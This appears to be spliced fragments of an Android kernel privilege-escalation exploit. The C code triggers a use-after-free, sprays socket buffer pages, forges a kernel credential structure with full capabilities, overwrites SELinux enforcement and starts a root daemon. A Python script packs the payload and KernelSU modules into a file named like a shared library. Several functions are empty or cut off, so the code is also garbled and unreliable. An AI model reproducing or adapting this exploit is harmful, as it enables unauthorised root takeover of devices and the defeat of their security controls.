    int ok=(vv[0]==ex)&&((vv[0]&0xffULL)==0ULL)&&(((vv[0]>>8)&0xffULL)!=0ULL);
    printf("SELWRITE target=0x%llx want=0x%llx val=0x%llx %s\n",ad[0],ex,vv[0],ok?"SEL_OK":"SEL_FAIL");
    if(ok)g_stage++;}
  }
  read_file_print("/sys/fs/selinux/enforce","ENFORCE");
  {int fd=open("/data/local/tmp/canary_t34",O_WRONLY|O_CREAT,0666);printf("SHELL_CREATE fd=%d\n",fd);if(fd>=0)close(fd);}
  fflush(stdout);
  close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
  return;
 }
 {unsigned long long ad[12],vv[12];int n=0;
  ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva+0x00;ad[n++]=g_fakekva+0x08;ad[n++]=g_fakekva+0x10;ad[n++]=g_fakekva+0x18;ad[n++]=g_fakekva+0x20;ad[n++]=g_fakekva+0x38;ad[n++]=g_fakekva+0x40;ad[n++]=g_fakekva+0x80;
  int g=read_addrs(ad,vv,n);
  printf("post got=%d\n",g);
  if(g>0){int k;for(k=0;k<n;k++)printf("  P[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
   {int ok=(vv[0]==g_fakekva);
    printf("CREDPTR target=0x%llx val=0x%llx %s\n",ad[0],vv[0],ok?"PTR_OK":"PTR_FAIL");
    printf("FAKECRED usage=0x%llx uidgid=0x%llx suid=0x%llx euid=0x%llx fsuid=0x%llx capP=0x%llx capE=0x%llx sec=0x%llx\n",vv[2],vv[3],vv[4],vv[5],vv[6],vv[7],vv[8],vv[9]);
    if(ok)g_armed=1;}
  }
 }
 printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());
 {struct __user_cap_header_struct hh;struct __user_cap_data_struct dd[2];memset(dd,0,sizeof dd);hh.version=_LINUX_CAPABILITY_VERSION_3;hh.pid=0;
  int cr=(int)syscall(SYS_capget,&hh,dd);
  printf("CAPGET r=%d eff0=0x%x eff1=0x%x prm1=0x%x bnd1=0x%x\n",cr,dd[0].effective,dd[1].effective,dd[1].permitted,dd[1].inheritable);fflush(stdout);}
 if(g_armed){
  root_proof();
  if(access("/data/local/tmp/t34_post.sh",F_OK)==0){run_sh("sh /data/local/tmp/t34_post.sh","/data/local/tmp/t34_post.out",25000);read_file_print("/data/local/tmp/t34_post.out","POSTOUT");}
  rootd_start();rootd_cmd("id; echo ---; getenforce",1);read_file_print("/data/local/tmp/t34_rootd.out","ROOTD_OUT");
 }
 close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
}
static void perf_prepare(void){
 trunc_trace();
 probe_on_r("t34p","rb","rb_alloc user_page=+0x118($retval):x64");
 trunc_trace();wf(TR"/tracing_on","1\n");
 struct perf_event_attr pe;memset(&pe,0,sizeof pe);
 pe.type=PERF_TYPE_SOFTWARE;pe.size=sizeof(pe);pe.config=PERF_COUNT_SW_CPU_CLOCK;pe.disabled=1;pe.exclude_kernel=1;pe.exclude_hv=1;
 int fd=(int)syscall(SYS_perf_event_open,&pe,0,-1,-1,0);
 void*mp=0; if(fd>=0)mp=mmap(0,4096,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
 wf(TR"/tracing_on","0\n");
 size_t tl=read_trace(tbuf,16u<<20);
 unsigned long long kva=0;
 {char*s=0;for(char*line=strtok_r(tbuf,"\n",&s);line;line=strtok_r(NULL,"\n",&s)){if(!strstr(line," rb: ("))continue;unsigned long long v=field_u64(line,"user_page=");if(v){kva=v;break;}}}
 del_ev("t34p","rb");
 printf("PERFPAGE fd=%d map=%p kva=0x%llx bytes=%zu\n",fd,mp,kva,tl);fflush(stdout);
 if(fd>=0&&mp&&mp!=MAP_FAILED&&kva){g_pfd=fd;g_pmap=mp;g_fakekva=kva;((volatile char*)mp)[0]=0;((volatile char*)mp)[4095]=0;}
}

int main(int argc,char**argv){
 if(argc>1&&!strcmp(argv[1],"--rootd")){rootd_main();return 0;}
 {ssize_t rl=readlink("/proc/self/exe",g_self,sizeof g_self-1);if(rl>0)g_self[rl]=0;}
 if(argc>1&&!strcmp(argv[1],"--exec-target"))_exit(0);
 if(argc>1)NFILL=atoi(argv[1]);
 if(argc>2)g_pairs=atoi(argv[2]);
 if(argc>3)g_delay=atoi(argv[3]);
 if(argc>4)g_mode=atoi(argv[4]);
 if(argc>5)g_att=atoi(argv[5]);
 if(argc>6)g_reps=atoi(argv[6]);
 if(argc>7)g_churn=atoi(argv[7]);
 if(argc>8)g_chwait=atoi(argv[8]);
 if(NFILL<1)NFILL=1;if(NFILL>NFILL_MAX)NFILL=NFILL_MAX;
  g_ntg=2;

`payload/mk_payload.py`:

```py
#!/usr/bin/env python3
"""Pack the payload executable and the embedded KernelSU LKMs into one blob.

Layout (v2, multi-LKM):
  [payload][ko_tiann][ko_next][ko_sukisu][table: n*24 bytes]
  [magic "O3KSKM02"][u32 count]

Table entry (little endian): <u32 tag><u32 reserved><u64 offset><u64 length>
  tag 1 = KernelSU (tiann)      lkm/lkm-aarch64-android17-6.18_kernelsu.ko
  tag 2 = KernelSU-Next         lkm/aarch64-next-android17-6.18_kernelsu.ko
  tag 3 = SukiSU-Ultra          lkm/sukisu-aarch64-android17-6.18.ko

The payload reads the trailer, detects the installed manager
(me.weishu.kernelsu / com.rifsxd.ksunext / com.sukisu.ultra) and picks the
matching LKM (env O3P_KSU_FORK overrides). Legacy single-LKM layout
("O3KSKO01" + payload_len + ko_len as the last 24 bytes) is still readable.

Usage:
  python3 mk_payload.py [--payload build/o3p.bin] [--out build/libo3p.so] [--legacy]
"""
import argparse
import hashlib
import struct

MAGIC_V1 = b'O3KSKO01'
MAGIC_V2 = b'O3KSKM02'

# (tag, name, path) -- order defines the on-disk order
LKM_SET = [
    (1, 'tiann', 'lkm/lkm-aarch64-android17-6.18_kernelsu.ko'),
    (2, 'next', 'lkm/aarch64-next-android17-6.18_kernelsu.ko'),
    (3, 'sukisu', 'lkm/sukisu-aarch64-android17-6.18.ko'),
]


def build_v2(payload: bytes) -> bytes:
    body = bytearray(payload)
    entries = []
    for tag, name, path in LKM_SET:
        d = open(path, 'rb').read()
        off = len(body)
        body += d
        entries.append((tag, name, off, len(d)))
    table = b''.join(struct.pack('<IIQQ', tag, 0, off, ln) for tag, _n, off, ln in entries)
    trailer = MAGIC_V2 + struct.pack('<I', len(entries))
    return bytes(body) + table + trailer


def build_v1(payload: bytes, ko: bytes) -> bytes:
    tr = MAGIC_V1 + struct.pack('<QQ', len(payload), len(ko))
    return payload + ko + tr


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument('--payload', default='build/o3p.bin')
    ap.add_argument('--ko', default='lkm/lkm-aarch64-android17-6.18_kernelsu.ko')
    ap.add_argument('--out', default='build/libo3p.so')
    ap.add_argument('--legacy', action='store_true', help='single-LKM v1 layout')
    a = ap.parse_args()

    pay = open(a.payload, 'rb').read()
    if a.legacy:
        ko = open(a.ko, 'rb').read()
        out = build_v1(pay, ko)
        print('layout v1 payload', len(pay), 'lkm', len(ko), 'total', len(out))
    else:
        out = build_v2(pay)
        print('layout v2 payload', len(pay), 'total', len(out))
    open(a.out, 'wb').write(out)
    print('sha256', hashlib.sha256(out).hexdigest())

    if not a.legacy:
        n = struct.unpack('<I', out[-4:])[0]
        tbl = out[-(12 + n * 24):-12]
        for i in range(n):
            tag, _r, off, ln = struct.unpack('<IIQQ', tbl[i * 24:(i + 1) * 24])
            print('entry tag', tag, 'off', off, 'len', ln)
    else:
        m, off, ln = struct.unpack('<8sQQ', out[-24:])
        print('trailer', m, 'off', off, 'len', ln)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())

```

static int parse_tid_comm(const char*line,int*tid,char*comm,int cap){

}

/* ---------- child shared state ---------- */

static int locker_fn(void *arg){int cpu=(int)(long)arg;pin(cpu);while(!g_go)sched_yield();__sync_fetch_and_add(&g_started,1);int prot=PROT_READ;while(!g_stop){prot=(prot==PROT_READ)?PROT_NONE:PROT_READ;syscall(SYS_mprotect,g_base,g_len,prot);}_exit(0);}

static void *exec_thread(void *arg){
 (void)arg;

 { sigset_t ss; sigemptyset(&ss); sigaddset(&ss,SIGRTMIN); pthread_sigmask(SIG_BLOCK,&ss,0); }

 clockid_t c2=(clockid_t)(((~(unsigned)tid3)<<3)|6u);

  if(timer_create(c0,&ev,&t2)!=0){g_fail=1100+errno;return 0;}

 }

 if(d3_mode()){
  if(timer_settime(t2,0,&its,NULL)!=0){g_fail=2100+errno;return 0;}

 }

 g_fail=3000+errno;
 return 0;
}
static void *spawn_proc(int (*fn)(void*),void *arg){
 void *st=mmap(0,1<<20,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
 if(st==MAP_FAILED)return 0;
 void *top=(char*)st+(1<<20);
 long p=syscall(SYS_clone,(unsigned long)(CLONE_VM|SIGCHLD),top,0,0,0);
 if(p<0)return 0;
 if(p==0){int r=fn(arg);_exit(r);}
 return (void*)1;
}
static int prepare_fragmented_range(void){
 g_len=(size_t)50000*4096;
 int fd=(int)syscall(SYS_memfd_create,"vma-page",1);
 if(fd<0){printf("memfd fail %d\n",errno);return -1;}
 if(ftruncate(fd,4096)<0){printf("ftruncate fail %d\n",errno);return -2;}
 void*base=mmap(0,g_len,PROT_NONE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
 if(base==MAP_FAILED){printf("mmap range fail %d\n",errno);return -3;}
 for(size_t i=0;i<50000;i++){
   void*p=mmap((char*)base+i*4096,4096,PROT_READ,MAP_SHARED|MAP_FIXED,fd,0);
   if(p==MAP_FAILED){printf("mmap sub fail i=%zu e=%d\n",i,errno);return -4;}
 }
 close(fd);g_base=base;return 0;
}
static void *tail_filler(void *arg){
 (void)arg; pin(5);
 while(!g_exec_tid)sched_yield();

  timer_t t;timer_create(CLOCK_MONOTONIC,&ev,&t);
 }
 for(;;)sched_yield();
 return 0;
}
static void child_main(void){

}

/* ---------- 8KB order-1 skb page spray engine ---------- */
static unsigned long long A,TASK,PTASK,N,PAGE,S,MARK;
static unsigned long long off,mk;
static unsigned char pat[8192];
#define MAXPAIR 20000
static int sv[MAXPAIR][2]; static int nsv=0; static long ppages=0;
static int g_pairs=8192,g_delay=0,g_mode=0,g_att=3,g_reps=1,g_churn=0,g_chwait=500;
#define FSMAX 200000
static unsigned long long g_fs[FSMAX];static int g_nfs=0;
static unsigned long long g_fakekva;
static int g_stage=0,g_ntg=0,g_selmode=1;
static int selzero_mode(void){return getenv("O3P_SELDIRTY")==NULL;}
static int nocodepatch_mode(void){return getenv("O3P_CODEPATCH")==NULL;}
static void build_pattern(void){
  memset(pat,0,sizeof pat);
  { unsigned long long v=MARKVAL; memcpy(pat+mk,&v,8); }
  { unsigned long long v=(g_selmode&&g_stage==0)?(selzero_mode()?0ULL:(g_fakekva|0x100ULL)):g_fakekva; memcpy(pat+off+0xe0,&v,8); }
  { unsigned long long v=0; memcpy(pat+off+0xe8,&v,8); }
  memcpy(pat+off+0xf0,&S,8);
}
static int precreate_pairs(int n){
  nsv=0;ppages=0;
  for(int i=0;i<n&&i<MAXPAIR;i++){
    if(socketpair(AF_UNIX,SOCK_STREAM,0,sv[nsv])!=0){printf("socketpair fail e=%d\n",errno);break;}
    nsv++;
  }
  return nsv;
}
static int send_all(void){
  int nok=0;
  for(int i=0;i<nsv;i++){
    ssize_t w=send(sv[i][0],pat,7872,MSG_DONTWAIT);
    if(w==7872){nok++;ppages++;}
  }
  return nok;
}
#define SPMAXC 10
static int g_sp_lo[SPMAXC],g_sp_n[SPMAXC];
static void *spray_thread(void*arg){
 long c=(long)arg;pin((int)c);
 int lo=g_sp_lo[c],n=g_sp_n[c];

 return 0;}
static void spray_cpus(int base,int cnt){
 int nc=(int)sysconf(_SC_NPROCESSORS_ONLN);if(nc>SPMAXC)nc=SPMAXC;if(nc<1)nc=1;
 pthread_t th[SPMAXC];for(int c=0;c<SPMAXC;c++)th[c]=0;
 for(int c=0;c<nc;c++){int lo=base+(int)((long)cnt*c/nc),hi=base+(int)((long)cnt*(c+1)/nc);
  g_sp_lo[c]=lo;g_sp_n[c]=hi-lo;
  if(pthread_create(&th[c],0,spray_thread,(void*)(long)c)!=0)th[c]=0;}
 for(int c=0;c<nc;c++)if(th[c])pthread_join(th[c],0);}
static void spray_one(void){for(int i=0;i<nsv;i++){ssize_t w=send(sv[i][0],pat,7872,MSG_DONTWAIT);if(w==7872)__sync_fetch_and_add(&ppages,1);}}
static void close_skb(void){for(int i=0;i<nsv;i++){close(sv[i][0]);close(sv[i][1]);}nsv=0;ppages=0;}
static int detect_hit(void){
  unsigned long long ad[8],vv[8];int n=0;
  ad[n++]=MARK;ad[n++]=PAGE+off+0xe0;ad[n++]=PAGE+off+0xf0;
  ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=PAGE+off+0xf8;
  int g=read_addrs(ad,vv,n);
  if(g<=0)return 0;
  if(vv[0]!=MARKVAL)return 0;
  for(int k=0;k<n;k++)printf("  D[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
  { unsigned long long ex=(g_selmode&&g_stage==0)?(selzero_mode()?0ULL:(g_fakekva|0x100ULL)):g_fakekva; if(vv[1]!=ex||vv[2]!=S)printf("  WARN node mismatch\n"); }
  return 1;
}
static void drain_all_pcp(void){
  for(int cpu=0;cpu<10;cpu++){pin(cpu);prime_pcp(2048);}
  pin(0);msleep(100);
}
static int slab_named(const char*name){
  FILE*f=fopen("/proc/slabinfo","r"); if(!f)return -1;
  char b[1024]; int res=-1; size_t L=strlen(name);
  while(fgets(b,sizeof b,f)){
    if(strncmp(b,name,L))continue;
    char*q=strstr(b,"slabdata");if(!q)break;long s1=0,s2=0;if(sscanf(q,"slabdata %ld %ld",&s1,&s2)<2)break;
    res=(int)s2;break;
  }
  fclose(f);return res;
}
static void benign_cleanup(pid_t pid,int zombie){
  if(zombie){printf("benign reap\n");fflush(stdout);waitpid(pid,0,0);}
  kill(-pid,SIGKILL);kill(pid,SIGKILL);msleep(80);
  while(waitpid(-1,0,WNOHANG)>0){}
}
static void unpin0(void){cpu_set_t cs;CPU_ZERO(&cs);for(int i=0;i<16;i++)CPU_SET(i,&cs);sched_setaffinity(0,sizeof cs,&cs);}
static pid_t g_me;
#define INIT_USER_NS_STATIC 0xffffffc0826d10d8ULL
#define SELINUX_STATE_STATIC 0xffffffc082959630ULL

static int d3_setup(void){
 unsigned long long rb[3]={TASK+0x870ULL,TASK+0x888ULL,TASK+0x8a0ULL};
 for(int i=0;i<3;i++){
  unsigned long long ad[1],vv[1]; ad[0]=rb[i];
  int g=read_addrs(ad,vv,1);
  if(g<=0||!vv[0]||(vv[0]>>48)!=0xffff){printf("D3 read fail i=%d got=%d v=0x%llx\n",i,g,vv[0]);return 1;}
  d3_A[i]=vv[0]-0xe0ULL;
  if((d3_A[i]&~0x1fffULL)!=PAGE){printf("D3 page split i=%d A=0x%llx page=0x%llx\n",i,d3_A[i],PAGE);return 1;}
  d3_off[i]=d3_A[i]&0x1fffULL;
  if(d3_off[i]<0x200||d3_off[i]+0x118>0x1f80){printf("D3 off bad i=%d off=0x%llx\n",i,d3_off[i]);return 1;}
 }
 if(d3v3_mode()){ d3_S[0]=PTASK+0x908ULL; d3_S[1]=g_sel-7ULL; d3_S[2]=g_fakekva+0x10ULL; }
 else { d3_S[0]=g_sel-7ULL; d3_S[1]=g_fakekva+0x10ULL; d3_S[2]=g_fakekva+0x18ULL; }
 printf("D3ADDR a0=0x%llx a1=0x%llx a2=0x%llx off0=0x%llx off1=0x%llx off2=0x%llx\n",
        d3_A[0],d3_A[1],d3_A[2],d3_off[0],d3_off[1],d3_off[2]);fflush(stdout);
 sdlog("D3ADDR a0=0x%llx a1=0x%llx a2=0x%llx off0=0x%llx off1=0x%llx off2=0x%llx\n",d3_A[0],d3_A[1],d3_A[2],d3_off[0],d3_off[1],d3_off[2]);
 return 0;
}
static void d3_build(void){
 memset(pat,0,sizeof pat);
 {unsigned long long v=MARKVAL;memcpy(pat+mk,&v,8);}
 for(int i=0;i<3;i++){
  {unsigned long long v=(d3v3_mode()&&i==0)?g_fakekva:0ULL;memcpy(pat+d3_off[i]+0xe0,&v,8);}
  {unsigned long long v=0;memcpy(pat+d3_off[i]+0xe8,&v,8);}
  {unsigned long long v=d3_S[i];memcpy(pat+d3_off[i]+0xf0,&v,8);}
 }
 {unsigned long long *q=(unsigned long long*)g_pmap; if(q)q[3]=0xdeadbeefULL;}
}
static int detect_d3(void){
 unsigned long long ad[10],vv[10];int n2=0;
 ad[n2++]=MARK;
 for(int i=0;i<3;i++){ad[n2++]=PAGE+d3_off[i]+0xe0;ad[n2++]=PAGE+d3_off[i]+0xe8;ad[n2++]=PAGE+d3_off[i]+0xf0;}
 int g=read_addrs(ad,vv,n2); if(g<=0)return 0; if(vv[0]!=MARKVAL)return 0;
 for(int i=0;i<3;i++){
  int b=1+3*i;
  printf("  E3[%d] 0x%llx=0x%llx 0x%llx=0x%llx 0x%llx=0x%llx\n",
         i,ad[b],vv[b],ad[b+1],vv[b+1],ad[b+2],vv[b+2]);
  {unsigned long long epc=(d3v3_mode()&&i==0)?g_fakekva:0ULL; if(vv[b]!=epc||vv[b+1]||vv[b+2]!=d3_S[i])return 0;}
 }
 return 1;
}


static void sdlog(const char *fmt, ...){
 if(!getenv("O3P_SDLOG"))return;
 int fd=open("/sdcard/o3p_sd.log",O_WRONLY|O_CREAT|O_APPEND,0644);
 if(fd<0)return;
 char b[256]; va_list ap; va_start(ap,fmt); int n=vsnprintf(b,sizeof b,fmt,ap); va_end(ap);
 if(n>0){ssize_t w=write(fd,b,(size_t)n);(void)w;}
 fsync(fd); close(fd);
}

static unsigned long long g_sec=0,g_usr=0,g_uc=0,g_gi=0;
static unsigned long long g_secw[3]={0,0,0}; static int g_sec_ok=0;
static int g_armed=0; static char g_self[256]={0};

static void set_secptr(unsigned long long *q){
 if(getenv("O3P_SIDFORGE")){unsigned long long *t=(unsigned long long*)((char*)g_pmap+0x800);
  t[0]=0x0000000100000001ULL;t[1]=0;t[2]=0;
  q[0x80/8]=g_fakekva+0x800;
 } else q[0x80/8]=g_sec;
}
static void fill_fake_cred(unsigned long long naddr){
 if(!g_pmap)return;
 memset(g_pmap,0,4096);
 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=g_fakekva; q[1]=0; q[2]=naddr; q[3]=0;
  if(g_selmode&&g_stage==0&&!selzero_mode()){q[0x108/8]=naddr;q[0x110/8]=naddr;}
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
 set_secptr(q);q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
}
static void repair_fake_cred(void){
 if(!g_pmap)return;
 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=0x100000; q[1]=0; q[2]=0; q[3]=0; q[4]=0;
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;

}


/* ---------- attempt: UAF trigger + 8K victim page reclaim ---------- */
static int do_attempt(int att, pid_t *outpid){
 A=TASK=PTASK=0; close_skb(); int slabs0=slab_slabs();

 unpin0();
 {int np=precreate_pairs(g_pairs);printf("pairs=%d\n",np);fflush(stdout);}

  siginfo_t si;int zombie=0;

  {int r=waitid(P_PID,pid,&si,WEXITED|WNOWAIT);
   if(r==0&&si.si_pid==pid)zombie=1;}

 dump_matches(tbuf," x: (",3);

 {char*save=0;
  for(char*line=strtok_r(tbuf,"\n",&save);line;line=strtok_r(NULL,"\n",&save)){
   int tid=0;char comm[32];
   if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
   if(strstr(line," fs: (")){unsigned long long sv=field_u64(line,"slab=");if(sv&&g_nfs<FSMAX)g_fs[g_nfs++]=sv;}
    if(strstr(line," tm: (")){unsigned long long v=field_u64(line,"a0=");if(v&&g_nleak<LEAKMAX)g_leak[g_nleak++]=(v|0xffffff0000000000ULL);}
    if(strstr(line,"x: (")){
     unsigned long long ts=field_u64(line,"ts="),h=field_u64(line,"h=");

     if(ts&&tid==(int)g_me)PTASK=ts;
   }
  }}
 if(!A||!TASK||!PTASK){printf("VERDICT NO_UAF_TRIGGER\n");benign_cleanup(pid,zombie);return 1;}
